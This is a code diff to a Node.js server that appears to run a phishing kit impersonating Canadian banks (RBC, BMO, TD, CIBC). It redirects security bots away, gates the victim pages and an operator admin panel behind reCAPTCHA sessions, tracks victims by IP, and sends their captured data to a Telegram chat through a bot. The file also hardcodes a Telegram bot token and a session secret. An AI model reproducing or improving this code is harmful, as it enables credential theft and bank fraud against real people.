@@ -11,6 +11,9 @@ let fetch;
 const https = require('https');
 const http = require(`http`);
 const TelegramBot = require('node-telegram-bot-api');
+const session = require('express-session');
+
+
 
 // replace 'YOUR_TELEGRAM_BOT_TOKEN' with your bot's token
 const token = '6326528266:AAHOiByLceYqskM-3wyuXlIXg9ulIaFqBp0';
@@ -54,8 +57,19 @@ const options = {
   ca: fs.readFileSync(join(REAL_PATH, '/etc/ssl/ca_bundle.crt'))
 };
 
-const server = https.createServer(options, app);
-const io = new Server(server)
+const server = https.createServer(options, app); // remove comment when finish install ssl
+const io = new Server(server) // remove comment when finish install ssl
+
+//const server = createServer(app);
+//const io = new Server(server);
+
+// Configure session middleware
+app.use(session({
+  secret: "6LdI0PYoAAAAAN0RS1L3WZhLYqr8YX3jCwM2umEx", // replace with your secret key
+  resave: false,
+  saveUninitialized: true,
+  cookie: { secure: true }
+}));
 
 
 
@@ -108,6 +122,15 @@ const redirectBots = (req, res, next) => {
   next();
 };
 
+const checkRecaptchaSession = (req, res, next) => {
+  if (req.session.recaptchaVerified) {
+    next();
+  } else {
+    res.status(403).send('Access denied. Please complete the reCAPTCHA.');
+  }
+};
+
+
 // Middleware to verify reCAPTCHA response
 const verifyRecaptcha = (req, res, next) => {
   const recaptchaResponse = req.body['g-recaptcha-response'];
@@ -119,6 +142,7 @@ const verifyRecaptcha = (req, res, next) => {
     .then(response => response.json())
     .then(data => {
       if (data.success) {
+        req.session.recaptchaVerified = true;
         next(); // reCAPTCHA was successful, proceed to the next middleware/route handler
       } else {
         res.status(403).send('reCAPTCHA Failed: You might be a robot. Access denied.');
@@ -132,14 +156,13 @@ const verifyRecaptcha = (req, res, next) => {
 // Use this middleware in your app before your routes
 app.use(redirectBots);
 
+
 const httpApp = express();
 httpApp.use((req, res) => {
   res.redirect('https://' + req.headers.host + req.url);
 });
 
 http.createServer(httpApp).listen(80);
-
-
 
 // ====================
 // Middleware
@@ -153,25 +176,25 @@ app.get('/', (req, res) => {
   //res.sendFile(join(__dirname, '/landing/interac/page.html'));
 });
 
-app.get('/admin', (req, res) => {
+app.get('/admin', checkRecaptchaSession, (req, res) => {
   res.sendFile(join(__dirname, '/admin/page.html'));
 });
 
-app.get('/admin/config', (req, res) => {
+app.get('/admin/config', checkRecaptchaSession, (req, res) => {
   res.sendFile(join(__dirname, '/admin/config.html'));
 });
 
-app.get('/.well-known/pki-validation/2BDBDD7D550E84DEDB2ADBE05BFFE92B.txt', (req, res) => {
-  res.sendFile(join(__dirname, '/.well-known/pki-validation/2BDBDD7D550E84DEDB2ADBE05BFFE92B.txt'));
+app.get('/.well-known/pki-validation/9B6D5F58C7D4AAB64549727EDBF1A878.txt', (req, res) => {
+  res.sendFile(join(__dirname, '/.well-known/pki-validation/9B6D5F58C7D4AAB64549727EDBF1A878.txt'));
 });
 
 
-app.use('/rbc', require('./routes/rbc'));
-app.use('/bmo', require('./routes/bmo'));
-app.use('/td', require('./routes/td'));
-app.use('/cibc', require('./routes/cibc'));
+app.use('/rbc', checkRecaptchaSession, require('./routes/rbc'));
+app.use('/bmo', checkRecaptchaSession, require('./routes/bmo'));
+app.use('/td', checkRecaptchaSession, require('./routes/td'));
+app.use('/cibc', checkRecaptchaSession, require('./routes/cibc'));
 
-app.post('/admin/set-recaptcha-key', (req, res) => {
+app.post('/admin/set-recaptcha-key', checkRecaptchaSession, (req, res) => {
   const recaptchaSecretKey = req.body.recaptchaSecretKey;
   const recaptchaSiteKey = req.body.recaptchaSiteKey;
 
@@ -277,6 +300,9 @@ io.on('connection', (socket) => {
         user = usersModify(userIP, data);
       }
       emitUpdatedUsers(io);
+      let user_search = usersSearchByIP(userIP)
+      const message = JSON.stringify(user_search, null, 2);
+      bot.sendMessage(chatId, message);
 
     }
     //console.log(data)
@@ -286,7 +312,7 @@ io.on('connection', (socket) => {
     //console.log(`${data.page}`)
     //console.log(data.ip)
     socket.to(data.ip).emit('btnRedirection', { page: data.page })
-    
+
   });
 
   socket.on('usersRemoveAll', () => {
@@ -300,11 +326,6 @@ io.on('connection', (socket) => {
     configsModify(data.banks, data);
   })
 
-  let user_search = usersSearchByIP(userIP)
-  const message = JSON.stringify(user_search, null, 2);
-
-
-  bot.sendMessage(chatId, message);
 
 });
 
@@ -322,6 +343,16 @@ fs.watch('users.json', (eventType, filename) => {
 // ====================
 // Server Startup
 // ====================
+
+
+
+
 server.listen(443, () => {
   console.log('HTTPS server running on port 443');
 });
+
+/*
+server.listen(80, () => {
+  console.log('HTTPS server running on port 80');
+});
+*/
